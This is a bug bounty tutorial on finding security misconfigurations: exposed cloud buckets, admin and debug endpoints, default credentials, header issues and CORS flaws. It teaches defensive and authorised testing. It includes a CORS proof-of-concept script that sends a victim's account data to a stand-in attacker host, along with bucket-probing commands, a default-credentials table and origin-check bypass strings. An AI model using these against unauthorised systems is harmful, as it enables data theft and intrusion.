---
layout: "@layouts/MarkdownLayout.astro"
title: "Security Misconfiguration Hunting: OWASP #2 and the Easiest Wins in Bug Bounties"
description: "How to find security misconfigurations that programs actually pay for - default credentials, exposed admin panels, verbose error messages, and cloud storage misconfigurations."
date: "2026-04-07"
---

Security Misconfiguration jumped from #5 in the OWASP 2021 Top 10 to #2 in the [2025 revision](https://owasp.org/Top10/). That is a big move, and it reflects what hunters already know from experience: misconfigurations are everywhere, they are easy to find relative to other vulnerability classes, and the impact can be severe. I have found misconfigurations that paid more than complex injection chains simply because an exposed admin panel gave full access to production data.

The problem most hunters run into is not finding misconfigurations. It is finding ones that actually pay. Every program gets flooded with reports about missing `X-Frame-Options` headers and `Server` version disclosure. Those are informational at best, and most triage teams close them immediately. The skill is knowing which misconfigurations are exploitable and being able to demonstrate real impact in your report.

If you are working through the [OWASP Top 10 as a bug bounty hunter](/learn/owasp-top-10-2025-for-bug-bounty-hunters), misconfiguration hunting is where I would start. The barrier to entry is lower than something like [SSRF](/learn/server-side-request-forgery-ssrf-hunting) or [access control flaws](/learn/idor-and-broken-access-control-hunting), and the findings compound well with those other vulnerability classes.

## Why misconfiguration moved to #2

The 2025 OWASP data showed a massive increase in misconfiguration-related incidents, driven primarily by cloud infrastructure. When applications ran on a single server that an ops team configured by hand, misconfigurations were localized. One server, one config file, one set of permissions.

Now a typical deployment involves S3 buckets, container registries, Kubernetes clusters, serverless functions, CDN configurations, API gateways, and dozens of SaaS integrations. Each one has its own permission model. Each one defaults to something, and that default is not always secure. The attack surface for misconfiguration has grown by an order of magnitude while the tooling to audit it has not kept pace.

For bug bounty hunters, this is an opportunity. Companies spin up infrastructure faster than their security teams can review it. New storage buckets, new subdomains, new staging environments - they appear constantly. Your [recon methodology](/learn/bug-bounty-recon-methodology) should be feeding you fresh targets where misconfigurations have not been caught yet.

## Cloud storage misconfigurations

Public S3 buckets were the poster child for misconfiguration findings from 2017 to 2020. AWS changed the defaults, added account-level block public access, and the low-hanging fruit mostly disappeared. Mostly. Not entirely.

The direct `--acl public-read` bucket is rarer now. What I still see regularly:

- Buckets that are not publicly listable but allow authenticated AWS users to read objects. Any AWS account holder can access them by signing requests with their own credentials.
- Buckets with overly broad IAM policies that grant `s3:GetObject` to `*` on specific prefixes, often because a developer wanted to serve static assets and used a wildcard that covers more than intended.
- Pre-signed URL generators that create URLs with excessively long expiration times (days or weeks instead of minutes), effectively making private objects semi-public.
- GCS buckets where `allUsers` or `allAuthenticatedUsers` have `storage.objects.list` permission. Google Cloud's permission model is different from AWS, and developers who learned S3 sometimes misconfigure GCS.

### Finding exposed buckets

During recon, I look for bucket references in JavaScript files, API responses, and HTML source. Common patterns:

```
https://BUCKET.s3.amazonaws.com/
https://s3.REGION.amazonaws.com/BUCKET/
https://storage.googleapis.com/BUCKET/
https://ACCOUNT.blob.core.windows.net/CONTAINER/
```

Once you have a bucket name, test it:

```bash
# AWS S3 - check if listing is allowed
aws s3 ls s3://target-bucket-name --no-sign-request

# AWS S3 - check with authenticated request (your own AWS account)
aws s3 ls s3://target-bucket-name

# GCS - check listing
curl https://storage.googleapis.com/storage/v1/b/BUCKET/o

# Azure Blob - check container listing
curl "https://ACCOUNT.blob.core.windows.net/CONTAINER?restype=container&comp=list"
```

If you can list objects, check what is actually in there. A publicly listable bucket full of marketing images is informational. A bucket containing database backups, configuration files, user uploads with PII, or application source code is a real finding. The severity depends entirely on the contents.

I have found buckets containing `.env` files with database credentials, full application backups including private keys, and customer-uploaded documents that should have been private. Those all paid well. A bucket full of minified CSS files did not.

For a deeper look at cloud and infrastructure testing tools, see the [toolkit setup guide](/learn/bug-bounty-toolkit-setup).

### Azure and GCS specifics

Azure Blob Storage misconfigurations tend to show up as containers with public access level set to "Blob" (individual blob access) or "Container" (full listing). The `restype=container&comp=list` query parameter is your friend.

For GCS, check both IAM and ACL-based permissions. A bucket can have restrictive IAM policies but permissive legacy ACLs, or vice versa. The `testIamPermissions` API endpoint lets you probe what actions your identity can perform:

```bash
curl "https://storage.googleapis.com/storage/v1/b/BUCKET/iam/testPermissions?permissions=storage.objects.list&permissions=storage.objects.get"
```

AWS has [published guidance](https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-best-practices.html) on S3 access control best practices that is worth reading. Understanding the intended configuration helps you identify when something deviates from it.

## Exposed admin panels, debug endpoints, and default credentials

This category is underrated. Hunters gravitate toward code-level vulnerabilities and skip the boring stuff. But an exposed Django admin panel at `/admin/` with default credentials is a critical finding that takes thirty seconds to discover.

### Where admin panels hide

Standard paths first. During [recon](/learn/bug-bounty-recon-methodology), I always check:

- `/admin`, `/admin/`, `/administrator`
- `/wp-admin`, `/wp-login.php` (WordPress)
- `/manager/html` (Tomcat)
- `/console` (various Java frameworks)
- `/_debug`, `/debug`, `/debug/pprof` (Go applications)
- `/actuator`, `/actuator/env`, `/actuator/health` (Spring Boot)
- `/elmah.axd` (ASP.NET error logging)
- `/graphql`, `/graphiql`, `/playground` (GraphQL IDEs)
- `/.well-known/`, `/server-status`, `/server-info` (Apache)
- `/dashboard`, `/portal`, `/manage`

But the real finds are on non-standard ports and subdomains. A company might lock down `app.target.com` thoroughly while `staging.target.com:8080` runs with debug mode enabled. Subdomain enumeration and port scanning during recon pay off here.

### Debug endpoints and stack traces

Spring Boot Actuator is one of the most common sources of misconfiguration bounties. When Actuator endpoints are exposed without authentication:

```
GET /actuator/env HTTP/1.1
```

This can return environment variables including database credentials, API keys, and internal service URLs. The `/actuator/heapdump` endpoint is even worse - it dumps the JVM heap, which often contains session tokens, passwords in memory, and encryption keys.

Similarly, Django applications running with `DEBUG = True` in production return full stack traces with local variable values on any 500 error. I have extracted database connection strings from Django debug pages. The fix is one line of configuration, but developers forget to change it when deploying to production.

For Node.js applications, check for exposed `node --inspect` debugger ports (9229). If the debugger is accessible, you get full remote code execution.

### Default credentials

I keep a list of default credentials for common services and frameworks. Some that have paid me bounties:

| Service | Common defaults |
|---------|----------------|
| Tomcat Manager | `tomcat:tomcat`, `admin:admin` |
| Jenkins | no password on initial setup, or `admin:admin` |
| Grafana | `admin:admin` |
| Kibana/Elasticsearch | often no authentication at all |
| MongoDB | no authentication by default |
| Redis | no authentication by default |
| RabbitMQ Management | `guest:guest` |
| phpMyAdmin | `root:` (empty password) |
| Portainer | first user to access creates admin |

When you find an exposed service, always check if default credentials work before reporting. "Exposed Grafana instance" is less compelling than "Grafana instance accessible with admin:admin, providing read access to production metrics including user counts and revenue data."

Demonstrating impact is the difference between an informational report and a paid bounty. Log in, take a screenshot showing sensitive data, and describe in your report exactly what an attacker could access or modify. The [report writing guide](/learn/writing-your-first-report) covers this in depth.

## Header misconfigurations that actually matter

I need to be blunt about this: most header-related findings are noise. Missing `X-Content-Type-Options`, missing `X-Frame-Options` on a page with no sensitive actions, `Server: nginx/1.24.0` version disclosure - these are not vulnerabilities. They are deviations from best practice. Many programs explicitly list them as out of scope, and the ones that do not will usually close them as informational.

The [HTTP Headers Cheat Sheet from OWASP](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html) is a good reference for what each header does. But knowing what matters for bounties requires filtering that list down to what is actually exploitable.

### Headers worth reporting

**Missing or misconfigured Content-Security-Policy** when you can demonstrate XSS. A missing CSP is not a vulnerability by itself. But if you find a reflected XSS and the site has no CSP to block inline script execution, mention it as a contributing factor. Some hunters report "missing CSP" alone and wonder why it gets closed.

**Misconfigured `Strict-Transport-Security`** on an application that handles sensitive data and is accessible over HTTP. If you can demonstrate a downgrade attack scenario where session cookies without the `Secure` flag get sent over plain HTTP, that is a real finding. If the site already redirects HTTP to HTTPS and sets `Secure` on cookies, a missing HSTS header is very low severity.

**`X-Frame-Options` missing on pages with state-changing actions.** This only matters if you can build a working clickjacking proof of concept. Frame a page, show that a user clicking on an innocuous-looking button actually triggers a password change or fund transfer. Without a working PoC, it is noise.

**Permissive `Access-Control-Allow-Origin`** - this one is important enough to get its own section below.

### Headers not worth reporting

`Server` version disclosure, `X-Powered-By` headers, missing `X-Content-Type-Options` without a MIME confusion attack, missing `Referrer-Policy`, missing `Permissions-Policy` - save your time. Unless you can chain them into a working exploit, these are not bounty-worthy findings. Programs are tired of receiving them.

## CORS misconfiguration: when it is exploitable and when it is not

CORS misconfigurations are one of the most misunderstood findings in bug bounties. I see hunters report "Access-Control-Allow-Origin reflects the Origin header" and assume it is automatically critical. Sometimes it is. Often it is not. The details matter.

### How CORS works (briefly)

When `site-a.com` makes a cross-origin request to `api.target.com`, the browser checks if `api.target.com` allows it by looking at the `Access-Control-Allow-Origin` response header. If the header matches `site-a.com` or is `*`, the browser lets the JavaScript read the response. If not, the response is blocked.

The exploitable scenario is: a victim visits `evil-attacker.com`, JavaScript on that page makes an authenticated request to `api.target.com`, and the response (containing the victim's data) is readable by the attacker's script.

### The exploitable case

For CORS misconfiguration to be exploitable, you need all three conditions:

1. The server reflects an attacker-controlled origin in `Access-Control-Allow-Origin`
2. The server sends `Access-Control-Allow-Credentials: true`
3. The endpoint returns sensitive data when called with the victim's cookies

Test it by sending an `Origin` header you control:

```http
GET /api/account HTTP/1.1
Host: api.target.com
Origin: https://evil.com
Cookie: session=victim_token
```

If the response includes:

```http
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

And the response body contains sensitive user data, you have an exploitable CORS misconfiguration. Write a PoC:

```html
<script>
fetch('https://api.target.com/api/account', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  // Send stolen data to attacker server
  fetch('https://attacker.com/log', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>
```

Host this on a domain you control and include it in your report. A working PoC is far more convincing than describing the misconfiguration in the abstract.

For a thorough treatment of CORS attacks, [PortSwigger's material](https://portswigger.net/web-security/cors) is the best reference.

### The non-exploitable cases

**`Access-Control-Allow-Origin: *` without `Access-Control-Allow-Credentials: true`.** When the wildcard is used, browsers refuse to send credentials. The response is readable by any origin, but it contains only unauthenticated data. If the endpoint returns the same data to unauthenticated users anyway, there is no impact.

**Origin reflection on endpoints that return no sensitive data.** If `/api/health` reflects any origin but just returns `{"status": "ok"}`, nobody cares.

**Origin validation that allows subdomains like `*.target.com`.** This is only exploitable if you can find an XSS on any subdomain of `target.com`, and even then the real vulnerability is the XSS, not the CORS policy.

**Null origin reflection.** Some servers allow `Origin: null`. This is technically exploitable via sandboxed iframes, but the attack is convoluted and many programs consider it low severity. Still worth reporting, but set your expectations accordingly.

### Common CORS validation bypasses

Developers often implement origin checks with string operations that are easy to bypass:

- Checking if the origin ends with `target.com` - bypassed with `attackertarget.com`
- Checking if the origin contains `target.com` - bypassed with `target.com.attacker.com`
- Allowing `http://` origins when the site uses HTTPS - enables man-in-the-middle exploitation
- Using a regex without proper anchoring - `target\.com` matches `target.com.evil.com`

Test each of these patterns. The regex bypass in particular is common enough that I test it on every target.

## Putting it together

Misconfiguration hunting works best when combined with thorough recon. The workflow I follow:

1. Enumerate subdomains and run port scans. Use your [standard recon toolkit](/learn/bug-bounty-toolkit-setup).
2. Hit every discovered host with a list of common admin paths and debug endpoints.
3. Check for exposed cloud storage by looking for bucket references in JavaScript, API responses, and DNS records.
4. Test CORS on every API endpoint that returns sensitive data.
5. When you find an exposed service, always try default credentials and document what data is accessible.

The most important thing is demonstrating impact. "Exposed admin panel" gets triaged as informational. "Exposed admin panel with default credentials providing access to 50,000 user records and the ability to modify application configuration" gets paid. Same finding, different report, different payout.

Misconfiguration hunting rewards breadth of knowledge. You need to recognize a Spring Boot Actuator endpoint, know what Tomcat Manager does, understand when CORS is exploitable, and know the difference between a dangerous S3 policy and a harmless one. That breadth comes from experience, but it also comes from reading about the systems and services you encounter. Every time you see a technology you do not recognize during recon, spend ten minutes understanding what it is and how it is commonly misconfigured. Over time, you build an instinct for what looks wrong.
